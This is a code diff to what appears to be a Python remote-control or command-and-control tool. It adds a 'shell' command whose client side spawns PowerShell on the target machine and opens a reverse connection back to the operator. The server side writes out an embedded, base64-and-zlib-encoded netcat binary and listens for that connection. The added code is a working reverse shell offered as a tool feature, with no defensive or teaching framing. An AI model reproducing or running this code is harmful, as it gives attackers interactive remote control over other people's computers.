@@ -1797,10 +1797,14 @@ class Geolocate(DoubleCommand):
             longest_key_len = max([len(key) for key in item])
             for key, value in item.items():
                 if isinstance(value, dict):
-                    print(f"{' ' * indent}{key.title().replace("_", " ")} {'-' * ((longest_key_len + 6) - len(key))}>")
+                    print(
+                        f"{' ' * indent}{key.title().replace('_', ' ')} {'-' * ((longest_key_len + 6) - len(key))}>"
+                    )
                     indent_print(value, indent + 4)
                 else:
-                    print(f"{' ' * indent}{key.title().replace("_", " ")} {'-' * ((longest_key_len + 1) - len(key))}> {value}")
+                    print(
+                        f"{' ' * indent}{key.title().replace('_', ' ')} {'-' * ((longest_key_len + 1) - len(key))}> {value}"
+                    )
 
         try:
             target_ip = client.socket.recv(39).decode(
@@ -1816,3 +1820,116 @@ class Geolocate(DoubleCommand):
         indent_print(info.all)
 
         return CommandResult(DoubleCommandResult.success, info.all)
+
+
+@add_double_command(
+    "shell",
+    "shell",
+    "Runs and interactive shell on the client",
+    [],
+    EmptyReturn,
+    no_new_process=True,
+    no_multitask=True,
+    max_selected=1,
+)
+class Shell(DoubleCommand):
+    @staticmethod
+    def client_side(sock: socket.socket) -> None:
+        # shell structure from revshells.com
+        import subprocess
+        import threading
+        import socket
+
+        def server_to_peer(
+            sock: socket.socket, process: subprocess.Popen, running: dict[str, bool]
+        ) -> None:
+            while running["running"]:
+                try:
+                    data = sock.recv(1024)
+                except TimeoutError:
+                    continue
+                except OSError:
+                    return
+                if len(data) > 0:
+                    process.stdin.write(data)  # type: ignore
+                    process.stdin.flush()  # type: ignore
+
+        def peer_to_server(
+            sock: socket.socket, process: subprocess.Popen, running: dict[str, bool]
+        ) -> None:
+            while running["running"]:
+                try:
+                    sock.send(process.stdout.read(1))  # type: ignore
+                except OSError:
+                    return
+
+        powershell_process = subprocess.Popen(
+            ["powershell"],
+            stdout=subprocess.PIPE,
+            stderr=subprocess.STDOUT,
+            stdin=subprocess.PIPE,
+        )
+
+        try:
+            shell_sock = socket.socket()
+            shell_sock.setblocking(True)
+            shell_sock.settimeout(5)
+            shell_sock.connect((sock.getpeername()[0], int.from_bytes(sock.recv(4))))
+        except OSError:
+            return
+
+        running = {"running": True}
+        s2p_thread = threading.Thread(
+            target=server_to_peer, args=[shell_sock, powershell_process, running]
+        )
+        s2p_thread.daemon = True
+        s2p_thread.start()
+
+        p2s_thread = threading.Thread(
+            target=peer_to_server, args=[shell_sock, powershell_process, running]
+        )
+        p2s_thread.daemon = True
+        p2s_thread.start()
+
+        powershell_process.wait()
+        running["running"] = False
+        shell_sock.close()
+
+    @staticmethod
+    def server_side(client: Client, params: tuple) -> CommandResult:
+        from shared.command_consts import NETCAT_B64_ZLIB_EXE
+        import subprocess
+        import socket
+        import base64
+        import zlib
+        import os
+
+        def find_random_port() -> int:
+            sock = socket.socket()
+            sock.bind(("localhost", 0))
+            _, port = sock.getsockname()
+            sock.close()
+            return port
+
+        def bail(msg: str) -> None:
+            print(msg)
+            os.remove(temp_file)
+
+        temp_file = f"{os.getenv('TEMP')}/nc.exe"
+        with open(temp_file, "wb") as netcat_exe:
+            netcat_exe.write(zlib.decompress(base64.b64decode(NETCAT_B64_ZLIB_EXE)))
+
+        port = find_random_port()
+        try:
+            client.socket.sendall(port.to_bytes(4))
+        except OSError:
+            bail("Failed to send port to client")
+            return CommandResult(DoubleCommandResult.conn_error)
+
+        subprocess.Popen(
+            [temp_file, "-lp", str(port)],
+            shell=True,
+        ).wait()
+        bail("Connection terminated")
+
+        return CommandResult(DoubleCommandResult.success)
